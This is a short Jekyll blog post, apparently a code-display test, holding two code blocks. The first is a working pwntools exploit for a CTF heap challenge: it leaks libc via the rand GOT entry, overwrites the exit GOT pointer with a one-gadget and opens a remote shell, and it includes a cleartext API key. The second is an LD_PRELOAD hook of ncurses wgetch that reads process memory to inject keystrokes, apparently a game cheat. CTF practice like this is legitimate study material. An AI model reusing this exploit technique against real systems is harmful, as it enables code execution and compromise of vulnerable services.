---
layout: post
cover: 'assets/images/cover6.jpg'
navigation: True
title: test2 post
date: 2018-07-19 10:18:00
tags: fiction
subclass: 'post tag-fiction'
logo: 'assets/images/ghost.png'
author: smlee
categories: smlee
---

# python test

```python
#!/usr/bin/env python
from pwn import *
import json

addr = "cowboy.eatpwnnosleep.com"
port = 14697
binary = "./cowboy"

elf = ELF(binary)

rand_plt = elf.plt['rand']
rand_got = elf.got['rand']


libc = ELF("./libc.so")
rand_offset = libc.symbols['rand']
system_offset = libc.symbols['system']

exit_got_ptr = 0x0000000000400708

s = remote(addr, port)

def auth():
    a = {
            'apikey' : '349b7ec9c6b3caa710b03589aede7a9bcf2c1466307e7f6a3ce3ef1b8c30aa0e',
        }
    s.send(json.dumps(a).encode())
    print s.recv(102400)

def menu(_index):
    sleep(0.1)
    s.recvuntil("5. exit")
    s.recvuntil("----------------------------------------")
    s.sendline(str(_index))

def alloc(_size):
    menu(1)
    sleep(0.3)
    s.recvuntil("Let's ding_malloc!\n")
    sleep(0.3)
    #s.recvuntil("Give me size n < 2049: ")
    s.sendline(str(_size))

def show_heap():
    menu(3)
    s.recvuntil("010 0x")
    rand_libc = int(s.recv(12),16)
    return rand_libc

def fill_data(_binnum, _chunknum, _data):
    menu(4)
    sleep(0.3)
    #s.recvuntil("bin num? : ")
    s.sendline(str(_binnum))
    sleep(0.3)
    #s.recvuntil("chunk num? : ")
    s.sendline(str(_chunknum))
    #s.recvuntil("input: ")
    sleep(0.3)
    s.send(_data)

def libc_leak():
    alloc(10)
    #alloc(10)
    fill_data(0,0, "A"*8+p64(rand_got))
    alloc(10)
    rand_libc = show_heap()
    return rand_libc

def solver(_system):
    fill_data(0,0, "A"*8+p64(exit_got_ptr))
    alloc(10)
    fill_data(0,4, p64(_system))
    menu(5)

auth()
rand_libc = libc_leak()

libc_base = rand_libc-rand_offset
system_libc = libc_base+system_offset
one_shot = libc_base + 0x4526a
log.info("rand_libc : %x" % rand_libc)
log.info("libc_base : %x" % libc_base)
log.info("system_libc : %x" % system_libc)
log.info("one_shot : %x" % one_shot)

solver(one_shot)

s.interactive()
s.close()
```


# c test

```c
#define _GNU_SOURCE
#include <ncurses.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>

typedef int (*origin_wgetch)(WINDOW*);

int count = 0;

int wgetch(WINDOW *win){
	char *line = 0x0000000000607648;
	char key[] = {'d','f','j','k'};

	for(int i = 0; i < 4; i++){
		if(line[i] == 'o' && ++count >= 20){
				count = 0;
				return key[i];
		}
	}

	origin_wgetch _wgetch = (origin_wgetch)dlsym(RTLD_NEXT, "wgetch");
	return _wgetch(win);
}

```